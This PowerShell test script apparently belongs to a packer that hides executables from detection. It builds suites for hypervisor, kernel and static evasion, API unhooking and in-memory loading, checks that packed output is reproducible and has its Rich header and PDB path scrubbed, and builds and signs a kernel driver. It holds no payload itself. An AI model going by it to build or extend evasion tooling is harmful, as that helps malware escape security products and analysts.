# Evasion verification: builds and runs both suites, then does an end-to-end
# pack/run/reproducibility check through the gate-free regression core.
#
#   powershell -NoProfile -ExecutionPolicy Bypass -File .\tools\test-evasion.ps1
#
# Exit code 0 means every suite reported 0 failures.
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $PSScriptRoot
Set-Location $root

$gcc = 'C:\mingw\mingw64\bin\g++.exe'
if (-not (Test-Path $gcc)) { $gcc = 'g++' }

$out = 'build\test'
New-Item -ItemType Directory -Force -Path $out | Out-Null

$common = @(
    '-std=c++17', '-Iinclude', '-Isrc',
    'src\evasion.cpp', 'src\evasion_entropy.cpp', 'src\evasion_variants.cpp',
    'src\evasion_static.cpp', 'src\evasion_dynamic.cpp', 'src\evasion_hypervisor.cpp', 'src\evasion_kernel.cpp', 'src\junk_emitter.cpp',
    'src\api_unhook.cpp', 'src\mem_loader.cpp', 'src\white_launcher.cpp',
    'src\pe_lib.cpp', 'src\disasm.cpp',
    '-static', '-static-libgcc', '-static-libstdc++', '-lbcrypt'
)

Write-Host '[1/4] building unit suite'
& $gcc '-O1' @common '-o' "$out\evasion_test.exe" 'tests\evasion_test.cpp'
if ($LASTEXITCODE -ne 0) { throw 'unit suite build failed' }

Write-Host '[2/4] building runtime suite'
& $gcc '-O1' '-g' '-municode' @common '-o' "$out\evasion_runtime_test.exe" 'tests\evasion_runtime_test.cpp' '-limagehlp'
if ($LASTEXITCODE -ne 0) { throw 'runtime suite build failed' }

function Invoke-Suite([string]$exe) {
    $lines = & $exe 2>&1
    $lines | Select-Object -Last 1 | Write-Host
    $summary = ($lines | Where-Object { $_ -match '(\d+) checks, (\d+) failure' }) | Select-Object -Last 1
    if (-not $summary -or $summary -notmatch '(\d+) checks, (\d+) failure') { throw "$exe produced no summary" }
    if ([int]$Matches[2] -ne 0) { throw "$exe reported $($Matches[2]) failure(s)" }
    return [int]$Matches[1]
}

Write-Host '[3/4] running suites'
$unit = Invoke-Suite "$out\evasion_test.exe"
$runtime = Invoke-Suite "$out\evasion_runtime_test.exe"

Write-Host '[4/4] end-to-end: pack, run, reproduce'
& (Join-Path $PSScriptRoot 'build-regression-core.ps1') | Out-Null
$core = "artifacts\test-only-core-$((Get-Content VERSION -Raw).Trim())\CoreRegression.exe"
$e2e = 'build\e2e'
New-Item -ItemType Directory -Force -Path $e2e | Out-Null
$seed = 'deadbeefcafef00d'

foreach ($name in 'e2e_a', 'e2e_b') {
    & $core 'tests\vm_target.exe' '-o' "$e2e\$name.exe" '-evasion' 'paranoid' '-junk' '3' '-evasion-seed' $seed | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "pack failed for $name" }
}
$a = (Get-FileHash "$e2e\e2e_a.exe" -Algorithm SHA256).Hash
$b = (Get-FileHash "$e2e\e2e_b.exe" -Algorithm SHA256).Hash
if ($a -ne $b) { throw "same seed did not reproduce the image ($a vs $b)" }
Write-Host "  ok   same seed -> identical image ($($a.Substring(0,16)))"

& "$e2e\e2e_a.exe" | Out-Null
if ($LASTEXITCODE -ne 0) { throw 'packed image did not run cleanly' }
Write-Host '  ok   packed image runs'

& $core "$e2e\e2e_a.exe" '-evasion-audit' | Out-Null
$audit = (& $core "$e2e\e2e_a.exe" '-evasion-audit' 2>&1) -join "`n"
if ($audit -notmatch 'Rich header: absent') { throw 'Rich header survived the pass' }
if ($audit -match 'PDB/CodeView: present') { throw 'PDB path survived the pass' }
Write-Host '  ok   static surface scrubbed'

Remove-Item "$e2e\*.exe" -Force -ErrorAction SilentlyContinue

Write-Host '[5/5] driver: emit, build with the WDK, sign'
# The driver is the only part of the evasion surface that is not proven by
# running the packed image, so it gets its own end-to-end stage: the emitter
# writes the source, cl.exe /kernel builds it, signtool signs and verifies it.
# Skipped with a printed notice when no WDK is installed -- never silently.
$driverState = 'skipped'
$wdkPresent = Test-Path 'C:\Windows Kits\10\Include' -PathType Container
if ($wdkPresent) {
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    & (Join-Path $PSScriptRoot 'test-driver-emit.ps1') 2>&1 | ForEach-Object { Write-Host "  $_" }
    $emitExit = $LASTEXITCODE
    if ($emitExit -eq 0) {
        & (Join-Path $PSScriptRoot 'sign-driver.ps1') 2>&1 | ForEach-Object { Write-Host "  $_" }
        $signExit = $LASTEXITCODE
    } else { $signExit = -1 }
    $ErrorActionPreference = $prev
    if ($emitExit -ne 0) { throw 'driver emit/build failed' }
    if ($signExit -ne 0) { throw 'driver signing failed' }
    $driverState = 'built+signed'
} else {
    Write-Host '  skip no WDK under C:\Windows Kits\10: driver not built, not proven'
}

Write-Host "EVASION-OK (unit $unit, runtime $runtime, e2e 3 checks, driver $driverState)"
